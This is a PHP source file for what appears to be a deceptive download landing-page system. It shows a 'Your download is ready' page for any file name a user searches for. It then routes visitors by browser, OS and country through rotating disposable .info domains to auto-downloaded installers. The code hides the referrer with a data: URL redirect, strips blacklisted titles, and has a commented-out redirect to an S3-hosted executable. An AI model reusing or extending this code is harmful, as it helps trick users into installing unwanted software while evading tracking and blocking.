<?php

namespace LPO;

use LPO\Digest\Injectable\Collection;
use LPO\Digest\Injectable\Configurable;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInjector;

use LPO\Digest\Injectable\McTorrentCheckBox;
use LPO\Persistence\InjectableType;
use QueryString;
use Util;
use Redis;
use Request;

use LPO\Db\Redis\Buffer;
use LPO\Digest\Digester;
use LPO\Digest\Injector;
use LPO\Digest\Injectable\Token;

use LPO\Persistence\Configuration as PConfiguration;

class Bootstrap {

	const MODE_PRODUCTION                  = 0b0;
	const MODE_TEMPORARY                   = 0b1;
	const MODE_NO_SCRIPT                   = 0b10;
	const MODE_NO_DOWNLOAD                 = 0b100;

	const REDIS_KEY_EXPIRED_DOMAIN         = 'lpo_expired_domain';
	const GET_PARAM_FILENAME               = 'q';
	const GET_PARAM_REF                    = 'ref';
	const GET_PARAM_FILENAME_DEFAULT_VALUE = 'Download';
	const MESSAGE_FILENAME_DEFAULT_VALUE   = 'Your download is ready';

	const REGEX_CHAIN_DOWNLOAD_DOMAIN            = '/\/wid\/[a-zA-Z0-9\-\_]+\/pid\/[a-zA-Z0-9\-\_]+\/?$/';
	const REGEX_DOWNLOAD_DOMAIN_WITH_PUBLISHER_V = '/^(?:https?\:[\/]{2})?[^\/]+[\/]v[0-9]+(?:.+)?$/i';

	static protected $_filename_param_names = array(
		'q',
		'installer_file_name',
		'product_name',
	);
	static protected $_blacklisted_words = array(
		'telos - vol.1 revelations of the new lemuria - vol.2 messages for the enlightenment of a humanity in transformation - vol.3 protocols of the fifth dimension.pdf',
		'kc rebell',
		'code.red',
		'skrillex - recess',
		'angela castle - warriors of kelon iii - resisting rachel',
		'warriors of kelon iii resisting rachel',
		'the purrfect plan australian shifters by angela castle',
		'the purrfect plan australian shifters',
		'angela castle the purrfect picture epub',
		'the purrfect picture',
		'angela castle',
		'technitrader',
		'autodata',
		'auto data',
		'autocad',
		'autod4ta',
		'objectivetoeic750pdf',
		'nox arcana',
	);

	/**
	 * @var Attributes
	 */
	public static $attributes;
	/**
	 * @var string
	 */
	public $downloadRedirectUrl;
	/**
	 * @var string
	 */
	public $downloadLink;
	/**
	 * @var string
	 */
	public $staticMediaPath;
	/**
	 * @var int
	 */
	public $mode;
	/**
	 * @var string
	 */
	public $redirect_url;
	/**
	 * @var ExternalId
	 */
	public $external_id;
	/**
	 * @var LandingPage
	 */
	public $landing_page;
	/**
	 * @var Publisher
	 */
	public $publisher;
	/**
	 * @var string
	 */
	public $ua;
	/**
	 * @var string
	 */
	public $downloadHostName;
	/**
	 * @var string
	 */
	public $ref;
	/**
	 * @var string
	 */
	public $iframeLink;
	/**
	 * @var string
	 */
	public $filename;
	/**
	 * @var string
	 */
	public $autoDownload = true;
	/**
	 * @var string
	 */
	public $button;
	/**
	 * @var string
	 */
	public $url;
	/**
	 * @var Brand
	 */
	public $brand;

	/**
	 * @param Publisher $publisher
	 * @param Attributes $attributes
	 * @param int $mode
	 *
	 * @todo add banner support
	 */
	function __construct(Publisher $publisher, Attributes $attributes, $mode = self::MODE_PRODUCTION)
	{
		static::$attributes = $attributes;

		$this->publisher = $publisher;
		$this->mode      = (int)$mode;
	}

    /**
     * @param string $downloadHostName
     * @param Publisher $publisher
     * @param string|bool $encodedFileName
     * @param bool $isFileSave
     *
     * @return string
     */
	public static function getDownloadRedirectUrl($downloadHostName, $publisher, $encodedFileName = false,$isFileSave = false)
	{
//		if(!$isFileSave &&
//			in_array(static::$attributes->getOsId(),array(
//				Request::OS_WIN_7,
//				Request::OS_WIN_8,
//				Request::OS_WIN_8_1,
//				Request::OS_WIN_XP_x64,
//				Request::OS_WIN_XP,
//				Request::OS_WIN_VISTA,
//			)) && ((int)substr(_CLOCK64(), -1, 1)) != 9 // 90%
//		){
//			define('AV_QUERY_TEST',true,true);
//			static::_getRedisConnection()->incr('AV_QUERY_TEST_2');
//			return 'https://s3-eu-west-1.amazonaws.com/aserve/ldownload.exe';
//		}

		if($encodedFileName !== false)
		{
			if(empty($encodedFileName))
			{
				$encodedFileName = static::GET_PARAM_FILENAME_DEFAULT_VALUE;
			}

			$postfix = '&q=%s&product_name=%s&installer_file_name=%s';
		}
		else
		{
			$postfix = '';
		}

		$publisherId = $publisher->getId();

		$affId = '';
		if(defined('OPT_TEST'))
		{
			$affId = OPT_TEST;
		}

		/*if(!$isFileSave && in_array(static::$attributes->getCountryCode(),array('A1', 'A2', 'AD', 'AG', 'AL', 'AO', 'CI', 'CN', 'GF', 'GG', 'GL', 'GN', 'IM', 'KE', 'KN', 'KZ', 'LC', 'LV', 'MD', 'MQ', 'MR', 'TG', 'TL', 'TZ')))
		{
			$randInt1000 = (int)substr(_CLOCK64(), -1, 1);
			if($randInt1000 <= 4) // 50%
			{
				$publisherId = 9528;
				$postfix .= '&affiliate_id='.$affId.'yossi';
			}
			elseif($randInt1000 <= 9) // 50%
			{
				$publisherId = 9529;
				$postfix .= '&affiliate_id='.$affId.'notyossi';
			}
		}else*/if(defined('OPT_TEST'))
		{
			$postfix .= '&affiliate_id='.OPT_TEST;
		}

//        if($publisherId == 714 || $publisherId == 969)
//        {
//            $postfix .= '&installer_type=IX_2013&affiliate_id=';
//
//            if($affiliateId = QueryString::getInstance()->getParam('affiliate_id'))
//            {
//                $postfix .= $affiliateId;
//            }
//
//            if(((int)substr(_CLOCK64(), -1, 1)) & 1)
//            {
//                $postfix .= '_pic&pic=1';
//            }
//            else
//            {
//                $postfix .= '_nr';
//            }
//        }

        if(!$isFileSave &&
			static::$attributes->getCountryCode() != 'IL' &&
			static::$attributes->getBrowserId() == Request::BROWSER_CHROME &&
			static::$attributes->getOsId() != Request::OS_WIN_8_1 &&
			static::$attributes->getOsId() != Request::OS_WIN_8
		)
        {
//            $postfix .= '&sn=3';
            $postfix .= '&st=0';
//            $postfix .= '&signature_name=kramoren';
        }
		else if(!$isFileSave && static::$attributes->getBrowserId() == Request::BROWSER_IE){
			$postfix .= '&signature_name=kramoren';
		}

//		if(!$isFileSave && static::$attributes->getBrowserId() != Request::BROWSER_CHROME)
//        {
//			if(((int)substr(_CLOCK64(), -1, 1)) & 1)
//            {
//				$postfix .= '&pic=1&pic_preloader_version=5&affiliate_id=pic5';
//            }else{
//				$postfix .= '&affiliate_id=notpic5';
//			}
//        }

		if(!(mb_strpos(strtolower($publisher->getBrand()->getName()),'ezdownload') !== false))
		{
			switch(strtolower(Request::getHostName()))
			{
				case 'webforallwebests.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=2';
					$downloadHostName = 'funapplicationgrabb.info';
					break;
				case 'websstarsurecomp.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=3';
					$downloadHostName = 'fundocumentsitefun.info';
					break;
				case 'zillionapplicationgrabb.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=4';
					$downloadHostName = 'fundraivermagicfast.info';
					break;
				case 'zilliondocumentsitefun.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=5';
					$downloadHostName = 'funmastercanadain.info';
					break;
				case 'zilliondraivermagicfast.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=6';
					$downloadHostName = 'funsolutioncustoml.info';
					break;
				case 'zillionmastercanadain.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=7';
					$downloadHostName = 'funsuperstoragemy.info';
					break;
				case 'zillionsolutioncustoml.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=8';
					$downloadHostName = 'funzillioncompletee.info';
					break;
				case 'zillionsuperstoragemy.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=9';
					$downloadHostName = 'funquickcoupon.info';
					break;
				case 'maxapplicationgrabb.info':
					$publisherId = 721;
					$postfix .= '&gyros=1';
					$postfix .= '&gyros_downloader_version=10';
					$downloadHostName = 'funquickshops.info';
					break;

				/**
				 * Kat.ph flow
				 */
				case 'maxdocumentsitefun.info':
//					$publisherId = 721;
//					$postfix .= '&gyros=1';
//					$postfix .= '&gyros_downloader_version=11';
					$downloadHostName = 'funrandomsale.info';
					break;


				case 'drivercardusa.info':
					$downloadHostName = 'toolkitset.info';
					break;
			}
		}

		// support chain
		if(preg_match(static::REGEX_CHAIN_DOWNLOAD_DOMAIN,$downloadHostName))
		{
			$url = sprintf('http://%s?'.$postfix, $downloadHostName, $encodedFileName, $encodedFileName, $encodedFileName);
			return Util::concatenateQueryStringToUrl($url);
		}
		else
		{
			$qs = sprintf($postfix, $encodedFileName, $encodedFileName, $encodedFileName);
			$qs = Util::concatenateQueryStringToUrl($qs);

			$ptr1 = 'http://%s?';
			$ptr2 = 'http://%s/v%s?';

			if(!$isFileSave)
			{
				$qs .= '&ttl='.substr(_CLOCK64(),0,13);
				$qs = 'q='.urlencode(base64x_encode($qs));
				$ptr1 = 'http://%s/lp/?';
				$ptr2 = 'http://%s/v%s/lp/?';
			}

			if (preg_match(static::REGEX_DOWNLOAD_DOMAIN_WITH_PUBLISHER_V, $downloadHostName))
			{
				$url = sprintf($ptr1, $downloadHostName) . $qs;
			}
			else
			{
				$url = sprintf($ptr2, $downloadHostName, $publisherId). $qs;
			}

			return $url;
		}
	}

	/**
	 * @param string|int $externalId
	 * @param string $downloadRedirectUrl
	 * @param string $publisherPath
	 * @param string|null $host
	 *
	 * @return string
	 */
	public static function getDownloadLink($externalId, $downloadRedirectUrl, $publisherPath, $host = null)
	{
		if(is_null($host))
		{
			$host = explode(':',$_SERVER['HTTP_HOST']);
		}

		return sprintf('http://%s/dl.php?id=%s&r=%s&__rnd=%s'
			, $host[0].'/'.md5(microtime()).'/'.$publisherPath
			, $externalId
			, $downloadRedirectUrl
			, md5(microtime())
		);
	}

	/**
	 * @param string $downloadLink
	 */
	public function setDownloadHostName($downloadLink)
	{
		$this->downloadHostName = $downloadLink;
	}

	/**
	 * @return bool
	 */
	public static function isMobile()
	{
		return in_array(static::$attributes->getOsId(),array(
			Request::OS_ANDROID,
			Request::OS_IOS,
			Request::OS_BLACKBERRY,
			Request::OS_SYMBIAN,
			Request::OS_xNOKIAx
			)
		);
	}

	/**
	 * @return bool
	 */
	public static function isMacOSX()
	{
		return static::$attributes->getOsId() == Request::OS_MAC_OSX;
	}

	/**
	 * @return bool
	 */
	public static function isChrome()
	{
		return static::$attributes->getBrowserId() == Request::BROWSER_CHROME;
	}

	/**
	 * @return bool
	 */
	public static function isMSIE()
	{
		return static::$attributes->getBrowserId() == Request::BROWSER_IE;
	}

	/**
	 * @return null|string
	 */
	public static function getRefFromRequest()
	{
		return isset($_REQUEST[static::GET_PARAM_REF]) ? $_REQUEST[static::GET_PARAM_REF] : null;
	}

	/**
	 * @return null|string
	 */
	public static function getFileNameFromRequest()
	{
		$filename = false;
		foreach (static::$_filename_param_names as $paramName)
		{
			if (isset($_REQUEST[$paramName])) {
				$filename = $_REQUEST[$paramName];
				break;
			}
		}

		if($filename === false){
			$filename = static::GET_PARAM_FILENAME_DEFAULT_VALUE;
		}

		$filteredFilename = trim(str_ireplace(static::$_blacklisted_words, '', $filename));
		return (empty($filteredFilename) ? static::GET_PARAM_FILENAME_DEFAULT_VALUE : $filteredFilename);
	}

	/**
	 * @return Redis
	 */
	protected static function _getRedisConnection()
	{
		return Buffer::getConnection();
	}

	/**
	 * @return bool
	 */
	public function shouldRender()
	{
		if(static::isMacOSX())
		{
//			$randInt100 = (int)substr(_CLOCK64(), -2, 2);
//			if($randInt100 <= 20) // 5%
//			{
//				static::serverRedirectToUrl(Util::concatenateQueryStringToUrl('downloadbooxl.com/MplayerX-2/?'));
//				return false;
//			}
//			elseif($randInt100 <= 10) // 5%
//			{
//				static::serverRedirectToUrl(Util::concatenateQueryStringToUrl('downloadbooxl.com/MplayerX-3/?'));
//				return false;
//			}

			if (!$this->_isTorrentTypedPublisher())
			{
				if ($this->_isVideoTypedPublisher()) {
					$this->_redirectToVideoMacOSX();
					return false;
				}

				if ($this->_isVaudixPublisher()) {
					$this->_redirectToVaudixMacOSX();
					return false;
				}

				$this->_redirectToGenericMacOSX();
				return false;
			}
		}

		if($this->_isExpiredUrl())
		{
			$this->_redirectToNewUrl();
			return false;
		}

		if(static::isMobile())
		{
			$this->_redirectToMobileDomain();
			return false;
		}

		if(static::isMSIE())
		{
//			if(static::$attributes->getCountryCode() == 'ID')
//			{
//				switch($this->publisher->getId())
//				{
//                    case 714:
//                    case 969:
//                    case 2942:
//						static::serverRedirectToUrl('trafficonlingetfun.org');
//						break;
//				}
//			}
			$this->_setDownloadHostnameFromRedis(PConfiguration::KEY_DOWNLOAD_DOMAIN_MSIE);
		}
		else if(static::isChrome())
		{
			$this->_setIframeLinkFromRedis(PConfiguration::KEY_IFRAME_LINK_CHROME);
		}

		return true;
	}

	/**
	 * @param ExternalId $externalId
	 * @param Attributes $attributes
	 *
	 * @return DownloadUrl
	 */
	public function getFileSaveDownloadUrl(ExternalId $externalId, Attributes $attributes)
	{
		$this->external_id  = $externalId;
		static::$attributes = $attributes;

		$this->_setDownloadHostnameFromRedis(PConfiguration::KEY_FILE_SAVE_DOWNLOAD_DOMAIN);

		$this->_fillTokenData();

		$downloadHostName = $this->downloadHostName;

		$redirectUrl = static::getDownloadRedirectUrl($downloadHostName, $this->publisher,false,true);

		return new DownloadUrl($redirectUrl,$this->external_id);
	}

	/**
	 * @param ExternalId $externalId
	 * @param LandingPage $landingPage
	 * @internal param \LPO\Attributes $attributes
	 *
	 * @return mixed
	 */
	public function renderLandingPage(ExternalId $externalId, LandingPage $landingPage)
	{
		$this->external_id  = $externalId;
		$this->landing_page = $landingPage;


		$mediaPath    = Digester::STATIC_LP_DIR_MEDIA_PATH;
		$relativePath = Digester::STATIC_LP_DIR;
		$noScript     = false;

		if ($this->mode & static::MODE_TEMPORARY)
		{
			$mediaPath    = Digester::STATIC_LP_DIR_MEDIA_PATH_PREVIEW;
			$relativePath = Digester::TEMP_DIR;
		}

		if($this->mode & static::MODE_NO_SCRIPT)
		{
			$noScript = true;
		}

		if($this->mode & static::MODE_NO_DOWNLOAD)
		{
			$this->autoDownload = false;
		}

		$this->_fillTokenData();

		$id = $this->landing_page->getId();
		$includeIndexPath = BASE.$relativePath.$id.DS.Injector::INDEX_FINAL;

		if(!is_readable($includeIndexPath))
		{
			error_log('LPO DEBUG:: chosen landing page('.$id.') is not readable, rendering fallback page'.PHP_EOL,3,'/var/log/nginx/error_lpo.log');

			ob_start();
			var_dump($this);
			$dump = ob_get_clean();
			error_log($dump.PHP_EOL,3,'/var/log/nginx/error_lpo.log');

			$this->landing_page = new LandingPage(LandingPage::FALLBACK_ID);
			$id = $this->landing_page->getId();
			$includeIndexPath = BASE.$relativePath.$id.DS.Injector::INDEX_FINAL;
		}

		$this->staticMediaPath = sprintf('http://%s%s%s/', $_SERVER['HTTP_HOST'], $mediaPath, $id);

		$this->ref        = static::getRefFromRequest();
		$publisherId      = $this->publisher->getId();
		$encodedFileName  = urlencode($this->filename);
		$downloadHostName = $this->downloadHostName;
		$externalId       = $this->external_id->getId();

		$this->downloadRedirectUrl = static::getDownloadRedirectUrl($downloadHostName, $this->publisher, $encodedFileName);
//		$this->downloadRedirectUrl = Util::concatenateQueryStringToUrl($this->downloadRedirectUrl);

		//TODO: feels like a patch
		$isMcTorrent = static::isMacOSX() && $this->_isTorrentTypedPublisher();
		if($isMcTorrent)
		{
			$this->brand = new Brand(MacVXTorrentBrand::ID);
			$this->brand->load();
			$this->brand->setText(MacVXTorrentBrand::getHtml());

			$this->autoDownload = false;
			$this->_setDownloadHostnameFromRedis(PConfiguration::KEY_MAC_OSX_TORRENT_DOWNLOAD_DOMAIN);
			$this->downloadLink = 'http://'.$this->downloadHostName . '&'.static::GET_PARAM_FILENAME.'='.static::getFileNameFromRequest();
			$this->downloadRedirectUrl = $this->downloadLink;
			$this->iframeLink = null;
		}

		$this->downloadLink = static::getDownloadLink($externalId, urlencode($this->downloadRedirectUrl), $this->publisher->getPath());

		$this->iframeLink = (empty($this->iframeLink)) ? null : Util::concatenateQueryStringToUrl(
			sprintf('http://%s/iframe.php?id=%s&d=%s&q=%s&__rnd=%s'
			, $this->iframeLink.'/'.md5(microtime())
			, $externalId
			, $publisherId
			, $encodedFileName
			, md5(microtime())
		));

		$vars              = array();
		$collection        = Collection::factory();
		$injectableObjects = $collection->getInjectableObjects();

		$injectableSettings = new Injectable(static::$attributes);
		$injectableSettingsValue = $injectableSettings->getValue();

		if(($injectableSettingsValue & InjectableType::AUTO_DOWNLOAD) != InjectableType::AUTO_DOWNLOAD) { $this->autoDownload = false; }

		// remove after click from McTorrent
		if($isMcTorrent && (($injectableSettingsValue & InjectableType::AFTER_CLICK) == InjectableType::AFTER_CLICK)) { $injectableSettingsValue ^= InjectableType::AFTER_CLICK; }

		foreach($injectableObjects as $injectableObjectArray)
		{
			/**
			 * @var JavascriptInjector|Configurable $injectableObject
			 */
			$injectableObject = &$injectableObjectArray[0];
			$variableName     = $injectableObject::getVariableName();

			//TODO: feels like a patch
			if($isMcTorrent && $injectableObject instanceof DownloadMethod)
			{
				$iframer = new DownloadMethod\Direct();
				$vars[$variableName] = $iframer->getSourceScript().';'.$iframer->getInvokingScript($this);
				continue;
			}

			if($injectableObject instanceof McTorrentCheckBox)
			{
				$vars[$variableName] = ($isMcTorrent)? $injectableObject->getTemplateVariableData($this): '';
				continue;
			}

			if(	// configurable and disabled in settings
				($injectableObject instanceof Configurable && !$injectableObject->isEnabled($injectableSettingsValue))
				// not Token and noScript flag is set to TRUE
				|| ($variableName !== Token::VARIABLE_NAME && $noScript)
			)
			{
				$vars[$variableName] = '';
				continue;
			}

			$vars[$variableName] = $injectableObject->getTemplateVariableData($this);
		}

		$tokenLookUpTable = array(
			Injector::STATIC_MEDIA_PATH => $this->staticMediaPath,
			'<![CDATA['                 => '',
			']]>'                       => '',
		);

		ob_start();
		extract($vars,EXTR_OVERWRITE);
		/** @noinspection PhpIncludeInspection */
		include($includeIndexPath);
		$content = ob_get_clean();
		$content = str_replace(array_keys($tokenLookUpTable), array_values($tokenLookUpTable), $content);
		return $content;
	}

	/**
	 * @param string $output
	 */
	public function send($output)
	{
		$output = str_ireplace(static::$_blacklisted_words,'',$output);

		header('Pragma:no-cache');
		header('Cache-Control:no-cache, no-store, must-revalidate, max-age=0');
		header('Cache-Control: post-check=0, pre-check=0', false);
		header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
		header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
		header('Content-Type: text/html');

		echo $output;
	}

	/**
	 * @param string $iframeLink
	 */
	public function setIframeLink($iframeLink)
	{
		$this->iframeLink = $iframeLink;
	}

	/**
	 * @param string $key
	 */
	protected function _setIframeLinkFromRedis($key)
	{
		$this->setIframeLink($this->_getPublisherConfigValue($key));
	}

	/**
	 * @param string $key
	 */
	protected function _setDownloadHostnameFromRedis($key)
	{
		$this->setDownloadHostName($this->_getPublisherConfigValue($key));
	}

	/**
	 * @return bool
	 */
	protected function _isExpiredUrl()
	{
		$buffer = static::_getRedisConnection();
		if($url = $buffer->hGet(static::REDIS_KEY_EXPIRED_DOMAIN, $_SERVER['HTTP_HOST']))
		{
			$this->redirect_url = $url;
			return true;
		}

		if($url = $buffer->hGet(static::REDIS_KEY_EXPIRED_DOMAIN, str_replace('www.','',$_SERVER['HTTP_HOST'])))
		{
			$this->redirect_url = $url;
			return true;
		}

		return !empty($this->redirect_url);
	}

	/**
	 *
	 */
	protected function _redirectToNewUrl()
	{
		$redirectUrl = $this->redirect_url;
		$filename    = static::getFileNameFromRequest();

		list($path) = explode('?', $_SERVER['REQUEST_URI'], 2);

		$ref = static::getRefFromRequest();

		$queryStringArray = array();
		if($filename)
		{
			$queryStringArray[] = static::GET_PARAM_FILENAME.'='.urlencode($filename);
		}
		if($ref)
		{
			$queryStringArray[] = static::GET_PARAM_REF.'='.$ref;
		}

		$queryString = count($queryStringArray) > 0 ? implode('&', $queryStringArray) : '';
		$url = Util::concatenateQueryStringToUrl($redirectUrl.$path.'?'.$queryString);
//		echo "<html><head><script type=\"text/javascript\">function go(){window.location.href = \"http://{$url}\";}</script></head><body onload='go()'></body></html>";
		echo '<!DOCTYPE html>'.PHP_EOL.'<html> <head><title></title> <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9"> <meta http-equiv="refresh" content="2; url='.$url.'"> </head> <body> <script type="text/javascript"> var url = "http://'.$url.'"; if(/*@cc_on!@*/false) { window.open(url, "_self"); } else { document.location.href = \'data:text/html,<html><meta http-equiv="refresh" content="0; url=\' + url + \'"></html>\'; } </script> </body> </html>';
		return;
	}

	/**
	 *
	 */
	protected function _redirectToGenericMacOSX()
	{
		$url   = $this->_getPublisherConfigValue(PConfiguration::KEY_MAC_OSX_REDIRECT_URL);
		$var = QueryString::getInstance()->getParam(static::GET_PARAM_FILENAME);
		static::serverRedirectToUrl(
			$url.(strpos($url,'?')!==false? '&' : '?').'q='.$this->publisher->getPath().
			(isset($var)? '&filename='.rawurlencode($var):'')
		);
		return;
	}

	/**
	 *
	 */
	protected function _fillTokenData()
	{
		$publisher = $this->publisher;

		// if IE download link was not already set
		if(empty($this->downloadHostName))
		{
			$this->_setDownloadHostnameFromRedis(PConfiguration::KEY_DOWNLOAD_DOMAIN);

		}

		if($this->mode == static::MODE_PRODUCTION)
		{
			$this->filename = static::getFileNameFromRequest();
			$this->ua       = $publisher->getUA();
			$brand          = $publisher->getBrand();
			$brand->load();
		}
		else
		{
			$this->filename = 'This is a very long file name with all sorts of chars []~!@#$%^&*()_+|\'",<>?\`~;'.urldecode('%E4%B8%80%E8%88%AC%E3%82%B3%E3%83%9F%E3%83%83%E3%82%AF)%20[%E5%B2%B8%E6%9C%AC%E6%96%89%E5%8F%B2]%0-%E3%83%8A%E3%83%AB%E3%83%88-%2001-63');
			$brand          = new Brand(Brand::TEST_BRAND_ID);
			$brand->load();
			$this->ua = '';
		}

		// remove non UTF-8 chars
		$this->filename = Util::removeInvalidUTF8Chars($this->filename);

		$this->brand = $brand;

	}

	/**
	 * @return array
	 */
	protected function _parseHttpHost()
	{
		$host      = explode('.', $_SERVER['HTTP_HOST']);
		$hostParts = array();

		$count = count($host);
		if($count < 3)
		{
			$hostParts['tld']    = array_pop($host);
			$hostParts['domain'] = array_pop($host);
		}
		else
		{
			$hostParts['tld']        = array_pop($host);
			$hostParts['domain']     = array_pop($host);
			$hostParts['sub-domain'] = implode('.', $host);
		}

		return $hostParts;
	}

	protected function _redirectToMobileDomain()
	{
		$url   = $this->_getPublisherConfigValue(PConfiguration::KEY_MOBILE_REDIRECT_URL);
		static::serverRedirectToUrl($url);
		return;
	}

	/**
	 * @param string $key
	 *
	 * @return string
	 */
	protected function _getPublisherConfigValue($key)
	{
		return static::_getConfigValueByPublisher($key,$this->publisher);
	}

	/**
	 * @param string $key
	 * @param Publisher $publisher
	 * @return string
	 */
	protected static function _getConfigValueByPublisher($key,Publisher $publisher)
	{
		return Configuration::getValue($key,$publisher);
	}

	/**
	 * @return bool
	 */
	protected function _isVaudixPublisher()
	{
		return $this->publisher->getBrand()->getId() == Brand::ID_VAUDIX;
	}

	/**
	 * @return bool
	 */
	protected function _isVideoTypedPublisher()
	{
		return PublisherType::getNameFromId($this->publisher->getType()) == 'video';
	}
	/**
	 * @return bool
	 */
	protected function _isTorrentTypedPublisher()
	{
		return PublisherType::getNameFromId($this->publisher->getType()) == 'mac traffic';
	}

	/**
	 *
	 */
	private function _redirectToVaudixMacOSX()
	{
		$url   = $this->_getPublisherConfigValue(PConfiguration::KEY_VAUDIX_MAC_OSX_REDIRECT_URL);
		if(!$url)
		{
			$this->_redirectToGenericMacOSX();
			return;
		}
		static::serverRedirectToUrl($url);
		return;
	}
	/**
	 *
	 */
	private function _redirectToVideoMacOSX()
	{
		$url   = $this->_getPublisherConfigValue(PConfiguration::KEY_VIDEO_MAC_OSX_REDIRECT_URL);
		if(!$url)
		{
			$this->_redirectToGenericMacOSX();
			return;
		}
		static::serverRedirectToUrl($url);
		return;
	}

	/**
	 * @param string $domainWithoutProtocol
	 */
	private static function serverRedirectToUrl($domainWithoutProtocol)
	{
		header('Location: http://' . $domainWithoutProtocol );
		return;
	}
}